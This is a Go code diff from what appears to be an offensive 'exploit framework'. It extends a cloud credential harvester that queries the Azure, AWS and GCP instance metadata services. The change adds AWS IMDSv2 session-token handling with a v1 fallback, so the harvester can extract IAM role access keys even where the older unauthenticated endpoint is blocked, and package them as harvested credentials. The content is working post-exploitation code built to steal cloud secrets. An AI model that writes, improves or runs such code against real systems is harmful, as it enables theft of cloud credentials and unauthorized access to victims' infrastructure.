@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io"
 	"net/http"
+	"strings"
 	"time"
 
 	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
@@ -30,10 +31,11 @@ type awsIMDSCredentials struct {
 }
 
 const (
-	azureIMDSURL = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
-	awsIMDSURL   = "http://169.254.169.254/latest/meta-data/"
-	gcpIMDSURL   = "http://metadata.google.internal/computeMetadata/v1/"
-	imdsTimeout  = 3 * time.Second
+	azureIMDSURL    = "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+	awsIMDSBase     = "http://169.254.169.254"
+	awsIMDSTokenURL = awsIMDSBase + "/latest/api/token"
+	gcpIMDSURL      = "http://metadata.google.internal/computeMetadata/v1/"
+	imdsTimeout     = 3 * time.Second
 )
 
 // harvestIMDS probes all cloud provider metadata endpoints to detect the
@@ -69,17 +71,17 @@ func harvestIMDS(ctx context.Context) *pb.CloudHarvestResult {
 		}
 	}
 
-	// Try AWS IMDS (v1 - no token needed)
-	if metadata, err := queryIMDS(ctx, client, awsIMDSURL, nil); err == nil && !found {
+	// Try AWS IMDS (v2 token first, fall back to v1)
+	if metadata, err := queryAWSIMDS(ctx, client, "/latest/meta-data/"); err == nil && !found {
 		result.Metadata = fmt.Sprintf(`{"aws_imds": "%s"}`, metadata)
 		result.Provider = "aws"
 		found = true
 
 		// H8: Parse AWS IAM role credentials into structured CloudCredential
-		rolePath := awsIMDSURL + "iam/security-credentials/"
-		if roleName, err := queryIMDS(ctx, client, rolePath, nil); err == nil && roleName != "" {
-			credURL := rolePath + roleName
-			if credData, err := queryIMDS(ctx, client, credURL, nil); err == nil {
+		rolePath := "/latest/meta-data/iam/security-credentials/"
+		if roleName, err := queryAWSIMDS(ctx, client, rolePath); err == nil && roleName != "" {
+			roleName = strings.TrimSpace(roleName)
+			if credData, err := queryAWSIMDS(ctx, client, rolePath+roleName); err == nil {
 				var creds awsIMDSCredentials
 				if err := json.Unmarshal([]byte(credData), &creds); err == nil && creds.AccessKeyId != "" {
 					result.Credentials = append(result.Credentials, &pb.CloudCredential{
@@ -120,6 +122,42 @@ func harvestIMDS(ctx context.Context) *pb.CloudHarvestResult {
 		return nil
 	}
 	return result
+}
+
+// getAWSIMDSToken obtains an IMDSv2 session token. Returns empty string on failure.
+func getAWSIMDSToken(ctx context.Context, client *http.Client) string {
+	req, err := http.NewRequestWithContext(ctx, http.MethodPut, awsIMDSTokenURL, nil)
+	if err != nil {
+		return ""
+	}
+	req.Header.Set("X-aws-ec2-metadata-token-ttl-seconds", "21600")
+
+	resp, err := client.Do(req)
+	if err != nil {
+		return ""
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return ""
+	}
+
+	body, err := io.ReadAll(io.LimitReader(resp.Body, 256))
+	if err != nil {
+		return ""
+	}
+	return strings.TrimSpace(string(body))
+}
+
+// queryAWSIMDS queries the AWS metadata service, trying IMDSv2 first then v1.
+func queryAWSIMDS(ctx context.Context, client *http.Client, path string) (string, error) {
+	url := awsIMDSBase + path
+	if token := getAWSIMDSToken(ctx, client); token != "" {
+		if data, err := queryIMDS(ctx, client, url, map[string]string{"X-aws-ec2-metadata-token": token}); err == nil {
+			return data, nil
+		}
+	}
+	return queryIMDS(ctx, client, url, nil)
 }
 
 func queryIMDS(ctx context.Context, client *http.Client, url string, headers map[string]string) (string, error) {
